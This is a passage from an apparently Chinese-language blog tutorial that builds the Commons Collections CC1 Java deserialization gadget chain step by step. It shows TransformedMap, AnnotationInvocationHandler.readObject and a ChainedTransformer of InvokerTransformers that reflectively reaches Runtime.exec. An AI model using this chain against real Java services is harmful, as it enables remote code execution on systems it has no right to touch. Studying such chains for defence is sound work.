class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>parent <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">public</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            value <span class=\"token operator\">=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">checkSetValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">return</span> entry<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>Map 的 entrySet () 方法返回一个实现 Map.Entry 接口的对象集合。集合中每个对象都是底层 Map 中一个特定的键 / 值对。通过这个集合的迭代器，获得每一个条目 (唯一获取方式) 的键或值并对值进行更改。</p>\n</blockquote>\n<p>查看 TransformedMap 的继承关系，发现 TransformedMap 继承类 Map 类，所以可以对 TransformedMap 进行 setValue 操作，所以就可以对 TransformedMap 中 CheckSetValue 的 value 值进行操作<br />\n<img data-src=\"https://s2.loli.net/2022/10/18/wxvoZlLbQTHhK2O.png\" alt=\"4.png\" /></p>\n<h3 id=\"阶段性总结\"><a class=\"anchor\" href=\"#阶段性总结\">#</a> 阶段性总结</h3>\n<p>Map.setValue(Runtime.getRuntime()) --&gt; TransformedMap.checkSetValue(Runtime.getRuntime()) ---&gt; InvokerTransformer.transform(Runtime.getRuntime())</p>\n<p>代码实现</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Runtime</span> runtime <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token class-name\">InvokerTransformer</span> invokerTransformer <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// invokerTransformer.transform(Runtime.getRuntime());</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> map <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    map<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> transformedMap <span class=\"token operator\">=</span> <span class=\"token class-name\">TransformedMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>map<span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> invokerTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span> entry<span class=\"token operator\">:</span> transformedMap<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        entry<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span>runtime<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><blockquote>\n<p>注意：map 必须 put 值，否则无法进行进行 Map.Entry，导致利用链无法成功调用</p>\n</blockquote>\n<h3 id=\"查找-entryset-的调用最好是在readobject中进行的调用\"><a class=\"anchor\" href=\"#查找-entryset-的调用最好是在readobject中进行的调用\">#</a> 查找 entrySet 的调用，最好是在 readObject 中进行的调用</h3>\n<blockquote>\n<p>由于方法调用多达 600 多个，所以直接给到 ysoserial 作者找到利用点</p>\n</blockquote>\n<p>在 sun.reflect.annotation.AnnotationInvocationHandler 中的 readObject 中实现了 Map.Entry<br />\n 并且 AnnotationInvocationHandler 并没有被修饰，为默认 default，只要引入同一包就能够访问</p>\n<p>&lt;b&gt;readObject 源码 &lt;/b&gt;</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>ObjectInputStream</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">defaultReadObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token comment\">// Check to make sure that types have not evolved incompatibly</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">AnnotationType</span> annotationType <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            annotationType <span class=\"token operator\">=</span> <span class=\"token class-name\">AnnotationType</span><span class=\"token punctuation\">.</span><span class=\"token function\">getInstance</span><span class=\"token punctuation\">(</span>type<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">IllegalArgumentException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token comment\">// Class is no longer an annotation type; time to punch out</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>InvalidObjectException</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Non-annotation type in annotation serial stream\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">Map</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span><span class=\"token punctuation\">></span></span> memberTypes <span class=\"token operator\">=</span> annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">memberTypes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\">// If there are annotation members without values, that</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token comment\">// situation is handled by the invoke method.</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Map<span class=\"token punctuation\">.</span>Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> memberValue <span class=\"token operator\">:</span> memberValues<span class=\"token punctuation\">.</span><span class=\"token function\">entrySet</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token class-name\">String</span> name <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getKey</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> memberType <span class=\"token operator\">=</span> memberTypes<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>memberType <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// i.e. member still exists</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token class-name\">Object</span> value <span class=\"token operator\">=</span> memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">getValue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token punctuation\">(</span>memberType<span class=\"token punctuation\">.</span><span class=\"token function\">isInstance</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>                      value <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">ExceptionProxy</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                    memberValue<span class=\"token punctuation\">.</span><span class=\"token function\">setValue</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                        <span class=\"token keyword\">new</span> <span class=\"token class-name\">AnnotationTypeMismatchExceptionProxy</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                            value<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"[\"</span> <span class=\"token operator\">+</span> value <span class=\"token operator\">+</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setMember</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                annotationType<span class=\"token punctuation\">.</span><span class=\"token function\">members</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>反射调用 AnnotationInvocationHandler</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> annotationInvocationHandler <span class=\"token operator\">=</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token function\">forName</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sun.reflect.annotation.AnnotationInvocationHandler\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token class-name\">Constructor</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> declaredConstructor <span class=\"token operator\">=</span> annotationInvocationHandler<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredConstructor</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Map</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">Object</span> o <span class=\"token operator\">=</span> declaredConstructor<span class=\"token punctuation\">.</span><span class=\"token function\">newInstance</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Override</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span>transformedMap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>理论来说，现在的链条已经构建完毕，但是存在三个小问题：</p>\n<ul>\n<li>Runtime 无法序列化</li>\n<li>annotationInvocationHandler.readObject 中 存在 if 条件</li>\n<li>memberValue.setValue 的 值为 AnnotationTypeMismatchExceptionProxy</li>\n</ul>\n<h3 id=\"问题解决\"><a class=\"anchor\" href=\"#问题解决\">#</a> 问题解决</h3>\n<blockquote>\n<p>Runtime 无法序列化的问题</p>\n</blockquote>\n<p>我们知道虽然 Runtime 无法序列化，但是它的 Class 是可以序列化的，所以这里可以使用 InvokerTransformer 来反射调用 Runtime</p>\n<p>Runtime 的反射代码</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Class</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">></span></span> runtimeClass <span class=\"token operator\">=</span> <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Method</span> getRuntime <span class=\"token operator\">=</span> runtimeClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">Runtime</span> guntime <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">)</span> getRuntime<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Method</span> exec <span class=\"token operator\">=</span> runtimeClass<span class=\"token punctuation\">.</span><span class=\"token function\">getMethod</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        exec<span class=\"token punctuation\">.</span><span class=\"token function\">invoke</span><span class=\"token punctuation\">(</span>guntime<span class=\"token punctuation\">,</span><span class=\"token string\">\"kate\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>InvokerTransformer 版的 Runtime 反射</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Method</span> invokerTransformer <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Method</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Runtime</span> invokerTransformer1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>invokerTransformer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span>invokerTransformer1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在的 Runtime 是可以进行序列化的，但是调用太麻烦，ChainedTransformer () 就可以完美解决这个问题</p>\n<hr />\n<p>Transformer implementation that chains the specified transformers together.<br />\nThe input object is passed to the first transformer. The transformed result is passed to the second transformer and so on.</p>\n<hr />\n<p>这是官方给出的注释，输入对象被传递给第一个转换器。转换后的结果传递给第二个变压器，依此类推。</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// ChainedTransformer 构造函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformers<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        iTransformers <span class=\"token operator\">=</span> transformers<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>InvokerTransformer 改为 ChainedTransformer</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> transformedMaps <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Transformer</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"getMethod\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"getRuntime\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"invoke\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">new</span> <span class=\"token class-name\">InvokerTransformer</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"exec\"</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Class</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"cmd\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">new</span> <span class=\"token class-name\">ChainedTransformer</span><span class=\"token punctuation\">(</span>transformedMaps<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>可以命令执行</p>\n<blockquote>\n<p>annotationInvocationHandler.readObject 中 存在的 if 条件</p>\n</blockquote>\n<p>查看主要源码</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">AnnotationType</span> annotationType <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token comment\">// 1 、 获取 